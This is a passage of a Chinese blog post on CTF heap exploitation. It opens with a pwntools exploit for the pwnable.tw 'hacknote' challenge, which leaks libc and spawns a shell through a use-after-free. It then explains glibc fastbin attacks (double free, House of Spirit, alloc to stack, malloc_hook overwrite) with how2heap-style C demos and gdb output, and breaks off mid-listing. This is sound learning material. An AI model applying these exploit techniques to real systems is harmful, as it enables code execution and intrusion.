class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = remote(<span class="hljs-string">&quot;chall.pwnable.tw&quot;</span>, <span class="hljs-number">10102</span>)<br><br>libc = ELF(<span class="hljs-string">&quot;./libc_32.so.6&quot;</span>)<br>e = ELF(<span class="hljs-string">&quot;./hacknote&quot;</span>)<br><br>context(terminal=[<span class="hljs-string">&#x27;gnome-terminal&#x27;</span>, <span class="hljs-string">&#x27;-x&#x27;</span>, <span class="hljs-string">&#x27;bash&#x27;</span>, <span class="hljs-string">&#x27;-c&#x27;</span>], os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;x86&#x27;</span>)<br><span class="hljs-comment"># context.log_level = &#x27;debug&#x27;</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">addnote</span>(<span class="hljs-params"><span class="hljs-built_in">len</span>, content</span>):</span><br>    io.sendlineafter(<span class="hljs-string">&quot;Your choice :&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>)<br>    io.sendlineafter(<span class="hljs-string">&quot;Note size :&quot;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>))<br>    io.sendlineafter(<span class="hljs-string">&quot;Content :&quot;</span>, content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delnote</span>(<span class="hljs-params">index</span>):</span><br>    io.sendlineafter(<span class="hljs-string">&quot;Your choice :&quot;</span>, <span class="hljs-string">&quot;2&quot;</span>)<br>    io.sendlineafter(<span class="hljs-string">&quot;Index :&quot;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">printnote</span>(<span class="hljs-params">index</span>):</span><br>    io.sendlineafter(<span class="hljs-string">&quot;Your choice :&quot;</span>, <span class="hljs-string">&quot;3&quot;</span>)<br>    io.sendlineafter(<span class="hljs-string">&quot;Index :&quot;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-comment"># 新建note0和note1并删除，注意删除顺序</span><br>addnote(<span class="hljs-number">16</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>addnote(<span class="hljs-number">16</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>delnote(<span class="hljs-number">1</span>)<br>delnote(<span class="hljs-number">0</span>)<br><span class="hljs-comment"># 新建note2，写入数据并执行</span><br>addnote(<span class="hljs-number">8</span>, flat(<span class="hljs-number">0x0804862B</span>, e.got[<span class="hljs-string">&#x27;read&#x27;</span>]))<br>printnote(<span class="hljs-number">1</span>)<br> <span class="hljs-comment"># 上一步泄露出了libc地址，处理得到system函数地址</span><br>libc_read_addr = u32(io.recv(<span class="hljs-number">4</span>))<br>log.success(<span class="hljs-string">&#x27;libc read addr: &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_read_addr))<br><span class="hljs-comment"># 删除note2</span><br>delnote(<span class="hljs-number">2</span>)<br><br>libcbase_addr = libc_read_addr - libc.symbols[<span class="hljs-string">&#x27;read&#x27;</span>]<br>system_addr = libcbase_addr + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>log.success(<span class="hljs-string">&#x27;libcbase addr: &#x27;</span> + <span class="hljs-built_in">hex</span>(libcbase_addr))<br>log.success(<span class="hljs-string">&#x27;system addr: &#x27;</span> + <span class="hljs-built_in">hex</span>(system_addr))<br><span class="hljs-comment"># gdb.attach(io)</span><br><span class="hljs-comment"># 重新建立note2，写入system地址和&#x27;||sh&#x27;字符串，执行函数</span><br>addnote(<span class="hljs-number">8</span>, flat(system_addr, <span class="hljs-string">&#x27;||sh&#x27;</span>)) <span class="hljs-comment"># 8或者12都是可以的</span><br><br>printnote(<span class="hljs-number">1</span>)<br><span class="hljs-comment"># get shell！</span><br>io.interactive()<br></code></pre></div></td></tr></table></figure><h1 id="Fastbin-Attack"><a href="#Fastbin-Attack" class="headerlink" title="Fastbin Attack"></a>Fastbin Attack</h1><p>几乎全为<a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/fastbin-attack/">CTF-WiKi</a>, 做了些修改以及添加了一点个人想法</p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>fastbin attack 是一类漏洞的利用方法，是指所有基于 fastbin 机制的漏洞利用方法。这类利用的前提是：</p><ul><li>存在堆溢出、use-after-free 等能控制 chunk 内容的漏洞</li><li>漏洞发生于 fastbin 类型的 chunk 中</li></ul><p>如果细分的话，可以做如下的分类：</p><ul><li><strong>Fastbin Double Free</strong> </li><li><strong>House of Spirit</strong> </li><li><strong>Alloc to Stack</strong> </li><li><strong>Arbitrary Alloc</strong> </li></ul><p>其中，前两种主要漏洞侧重于利用 <code>free</code> 函数释放<strong>真的 chunk 或伪造的 chunk</strong>，然后再次申请 chunk 进行攻击，后两种侧重于故意修改 <code>fd</code> 指针，直接利用 <code>malloc</code> 申请指定位置 chunk 进行攻击。</p><h2 id="Fastbin-Double-Free"><a href="#Fastbin-Double-Free" class="headerlink" title="Fastbin Double Free"></a>Fastbin Double Free</h2><h3 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h3><p>Fastbin Double Free 是指 fastbin 的 chunk 可以被多次释放，因此可以在 fastbin 链表中存在多次。这样导致的后果是多次分配可以从 fastbin 链表中取出同一个堆块，相当于多个指针指向同一个堆块，结合堆块的数据内容可以实现类似于类型混淆 (type confused) 的效果。</p><p>Fastbin Double Free 能够成功利用主要有两部分的原因</p><ol><li>fastbin 的堆块被释放后 next_chunk 的 <strong>pre_inuse</strong> 位不会被清空</li><li>fastbin 在执行 free 的时候仅验证了 <strong>main_arena</strong> 直接指向的块，即链表指针头部的块。对于链表后面的块，并没有进行验证。</li></ol><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* Another simple check: make sure the top of the bin is not the</span><br><span class="hljs-comment">       record we are going to add (i.e., double free).  */</span><br>    <span class="hljs-keyword">if</span> (__builtin_expect (old == p, <span class="hljs-number">0</span>))<br>      &#123;<br>        errstr = <span class="hljs-string">&quot;double free or corruption (fasttop)&quot;</span>;<br>        <span class="hljs-keyword">goto</span> errout;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">chunk</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> pre_size;<br>    <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> size;<br>    <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> fd;<br>    <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> bk;<br>&#125; CHUNK,*PCHUNK;<br><br>CHUNK bss_chunk;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">void</span> *chunk1,*chunk2,*chunk3;<br>    <span class="hljs-keyword">void</span> *chunk_a,*chunk_b;<br><br>    bss_chunk.size=<span class="hljs-number">0x21</span>;<br>    chunk1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    chunk2=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br><br>    <span class="hljs-built_in">free</span>(chunk1);<br>    <span class="hljs-built_in">free</span>(chunk2);<br>    <span class="hljs-built_in">free</span>(chunk1);<br><br>    chunk_a=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    *(<span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> *)chunk_a=&amp;bss_chunk;<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    chunk_b=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p&quot;</span>,chunk_b);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="House-Of-Spirit"><a href="#House-Of-Spirit" class="headerlink" title="House Of Spirit"></a>House Of Spirit</h2><h3 id="介绍-2"><a href="#介绍-2" class="headerlink" title="介绍"></a>介绍</h3><p>House of Spirit 是 <code>the Malloc Maleficarum</code> 中的一种技术。</p><p>该技术的核心在于在目标位置处伪造 fastbin chunk，并将其释放，从而达到分配<strong>指定地址</strong>的 chunk 的目的。</p><p>要想构造 fastbin fake chunk，并且将其释放时，可以将其放入到对应的 fastbin 链表中，需要绕过一些必要的检测，即</p><ul><li>fake chunk 的 ISMMAP 位不能为 1，因为 free 时，如果是 mmap 的 chunk，会单独处理。</li><li>fake chunk 地址需要对齐， MALLOC_ALIGN_MASK</li><li>fake chunk 的 size 大小需要满足对应的 fastbin 的需求，同时也得对齐。</li><li>fake chunk 的 next chunk 的大小不能小于 <code>2 * SIZE_SZ</code>，同时也不能大于<code>av-&gt;system_mem</code> 。</li><li>fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况。</li></ul><h3 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h3><p>这里就直接以 how2heap 上的例子进行说明，如下</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;This file demonstrates the house of spirit attack.\n&quot;</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Calling malloc() once so that it sets up its memory.\n&quot;</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;We will now overwrite a pointer to point to a fake &#x27;fastbin&#x27; region.\n&quot;</span>);<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> *a;<br>    <span class="hljs-comment">// This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)</span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> fake_chunks[<span class="hljs-number">10</span>] __attribute__ ((aligned (<span class="hljs-number">16</span>)));<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.\n&quot;</span>, <span class="hljs-keyword">sizeof</span>(fake_chunks), &amp;fake_chunks[<span class="hljs-number">1</span>], &amp;fake_chunks[<span class="hljs-number">7</span>]);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n&quot;</span>);<br>    fake_chunks[<span class="hljs-number">1</span>] = <span class="hljs-number">0x40</span>; <span class="hljs-comment">// this is the size</span><br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\n&quot;</span>);<br>        <span class="hljs-comment">// fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8</span><br>    fake_chunks[<span class="hljs-number">9</span>] = <span class="hljs-number">0x1234</span>; <span class="hljs-comment">// nextsize</span><br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n&quot;</span>, &amp;fake_chunks[<span class="hljs-number">1</span>]);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n&quot;</span>);<br>    a = &amp;fake_chunks[<span class="hljs-number">2</span>];<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Freeing the overwritten pointer.\n&quot;</span>);<br>    <span class="hljs-built_in">free</span>(a);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n&quot;</span>, &amp;fake_chunks[<span class="hljs-number">1</span>], &amp;fake_chunks[<span class="hljs-number">2</span>]);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;malloc(0x30): %p\n&quot;</span>, <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x30</span>));<br>&#125;<br></code></pre></div></td></tr></table></figure><p>运行后的效果如下</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">➜  how2heap git:(master) ./house_of_spirit<br>This file demonstrates the house of spirit attack.<br>Calling malloc() once so that it sets up its memory.<br>We will now overwrite a pointer to point to a fake &#x27;fastbin&#x27; region.<br>This region (memory of length: 80) contains two chunks. The first starts at 0x7ffd9bceaa58 and the second at 0x7ffd9bceaa88.<br>This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.<br>... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end.<br>The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.<br>Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, 0x7ffd9bceaa58.<br>... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.<br>Freeing the overwritten pointer.<br>Now the next malloc will return the region of our fake chunk at 0x7ffd9bceaa58, which will be 0x7ffd9bceaa60!<br>malloc(0x30): 0x7ffd9bceaa60<br></code></pre></div></td></tr></table></figure><h3 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h3><p>可以看出，想要使用该技术分配 chunk 到指定地址，其实并不需要修改指定地址的任何内容，<strong>关键是要能够修改指定地址的前后的内容使其可以绕过对应的检测</strong>。还能怎样绕过呢? 暂时只知道上面的方法, 有待补充.</p><h2 id="Alloc-to-Stack"><a href="#Alloc-to-Stack" class="headerlink" title="Alloc to Stack"></a>Alloc to Stack</h2><h3 id="介绍-3"><a href="#介绍-3" class="headerlink" title="介绍"></a>介绍</h3><p>前文所讲的 Fastbin Double Free 与 house of spirit 技术和本节所讲的Alloc to Stack，它们的本质都在于 fastbin 链表的特性：<strong>当前 chunk 的 fd 指针指向下一个 chunk。</strong> </p><p>该技术的核心点在于劫持 fastbin 链表中 chunk 的 fd 指针，把 fd 指针指向我们想要分配的栈上，从而实现控制栈中的一些关键数据，比如返回地址等。</p><h3 id="演示-1"><a href="#演示-1" class="headerlink" title="演示"></a>演示</h3><p>这次我们把 fake_chunk 置于栈中称为 stack_chunk，同时劫持了 fastbin 链表中 chunk 的 fd 值，通过把这个 fd 值指向 stack_chunk 就可以实现在栈中分配 fastbin chunk。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">chunk</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> pre_size;<br>    <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> size;<br>    <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> fd;<br>    <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> bk;<br>&#125; CHUNK,*PCHUNK;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    CHUNK stack_chunk;<br><br>    <span class="hljs-keyword">void</span> *chunk1;<br>    <span class="hljs-keyword">void</span> *chunk_a;<br><br>    stack_chunk.size=<span class="hljs-number">0x21</span>;<br>    chunk1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>); <span class="hljs-comment">//0x10是user date, chunk1指向的是fd指针</span><br><br>    <span class="hljs-built_in">free</span>(chunk1); <span class="hljs-comment">//free chunk1之后fastbin中只有这一个chunk, fd指向NULL, </span><br><br>    *(<span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> *)chunk1=&amp;stack_chunk; <span class="hljs-comment">//修改为8字节的指针, 将fd指针赋值为stack_chunk</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>); <span class="hljs-comment">//将chunk1取出</span><br>    chunk_a=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>); <span class="hljs-comment">//malloc出了一个fack_chunk(stack_chunk), 这样我们就可以修改栈上的数据了</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>通过 gdb 调试可以看到我们首先把 chunk1 的 fd 指针指向了 stack_chunk</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">0x602000:   0x0000000000000000  0x0000000000000021 &lt;=== chunk1<br>0x602010:   0x00007fffffffde60  0x0000000000000000<br>0x602020:   0x0000000000000000  0x0000000000020fe1 &lt;=== top chunk<br></code></pre></div></td></tr></table></figure><p>之后第一次 malloc 使得 fastbin 链表指向了 stack_chunk，这意味着下一次分配会使用 stack_chunk 的内存进行</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">0x7ffff7dd1b20 &lt;main_arena&gt;:    0x0000000000000000 &lt;=== unsorted bin<br>0x7ffff7dd1b28 &lt;main_arena+8&gt;:  0x00007fffffffde60 &lt;=== fastbin[0]<br>0x7ffff7dd1b30 &lt;main_arena+16&gt;: 0x0000000000000000<br></code></pre></div></td></tr></table></figure><p>最终第二次 malloc 返回值为 0x00007fffffffde70 也就是 stack_chunk</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">   0x400629 &lt;main+83&gt;        call   0x4004c0 &lt;malloc@plt&gt;<br> → 0x40062e &lt;main+88&gt;        mov    QWORD PTR [rbp-0x38], rax<br><span class="hljs-meta">   $</span><span class="bash">rax   : 0x00007fffffffde70</span><br><br>0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/Ox9A82/tst/tst<br>0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/Ox9A82/tst/tst<br>0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/Ox9A82/tst/tst<br>0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap]<br>0x00007ffff7a0d000 0x00007ffff7bcd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so<br>0x00007ffff7bcd000 0x00007ffff7dcd000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so<br>0x00007ffff7dcd000 0x00007ffff7dd1000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so<br>0x00007ffff7dd1000 0x00007ffff7dd3000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so<br>0x00007ffff7dd3000 0x00007ffff7dd7000 0x0000000000000000 rw-<br>0x00007ffff7dd7000 0x00007ffff7dfd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.23.so<br>0x00007ffff7fdb000 0x00007ffff7fde000 0x0000000000000000 rw-<br>0x00007ffff7ff6000 0x00007ffff7ff8000 0x0000000000000000 rw-<br>0x00007ffff7ff8000 0x00007ffff7ffa000 0x0000000000000000 r-- [vvar]<br>0x00007ffff7ffa000 0x00007ffff7ffc000 0x0000000000000000 r-x [vdso]<br>0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000025000 r-- /lib/x86_64-linux-gnu/ld-2.23.so<br>0x00007ffff7ffd000 0x00007ffff7ffe000 0x0000000000026000 rw- /lib/x86_64-linux-gnu/ld-2.23.so<br>0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-<br>0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]<br>0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]<br></code></pre></div></td></tr></table></figure><h3 id="小总结-1"><a href="#小总结-1" class="headerlink" title="小总结"></a>小总结</h3><p>通过该技术我们可以把 fastbin chunk 分配到栈中，从而控制返回地址等关键数据。要实现这一点我们需要劫持 fastbin 中 chunk 的 fd 域，把它指到栈上，当然同时需要栈上存在有满足条件的 size 值。</p><h2 id="Arbitrary-Alloc"><a href="#Arbitrary-Alloc" class="headerlink" title="Arbitrary Alloc"></a>Arbitrary Alloc</h2><h3 id="介绍-4"><a href="#介绍-4" class="headerlink" title="介绍"></a>介绍</h3><p>Arbitrary Alloc 其实与 Alloc to stack 是完全相同的，唯一的区别是分配的目标不再是栈中。 事实上只要满足目标地址存在合法的 size 域（这个 size 域是构造的，还是自然存在的都无妨），我们可以把 chunk 分配到任意的可写内存中，比如 <strong>bss、heap、data、stack</strong> 等等。</p><h3 id="演示-2"><a href="#演示-2" class="headerlink" title="演示"></a>演示</h3><p>在这个例子，我们使用字节错位来实现直接分配 fastbin 到**_malloc_hook 的位置，相当于覆盖_malloc_hook 来控制程序流程。** </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">void</span> *chunk1;<br>    <span class="hljs-keyword">void</span> *chunk_a;<br><br>    chunk1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x60</span>);<br><br>    <span class="hljs-built_in">free</span>(chunk1);<br><br>    *(<span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> *)chunk1=<span class="hljs-number">0x7ffff7dd1af5</span><span class="hljs-number">-0x8</span>;<span class="hljs-comment">//1ad5是malloc_hook的位置, 由于fd指针指向的是chunk的开头, </span><br>    <span class="hljs-comment">//所以要覆盖malloc_hook要往前8字节使其成为user date</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x60</span>); <span class="hljs-comment">//malloc出temp</span><br>    chunk_a=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x60</span>); <span class="hljs-comment">//往这个指针里面写内容就可以改写malloc_hook</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>这里的 <strong>0x7ffff7dd1af5</strong> 是我根据本机的情况得出的值，这个值是怎么获得的呢？首先我们要观察欲写入地址附近是否存在可以<strong>字节错位</strong>的情况。</p><figure class="highlight sh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span 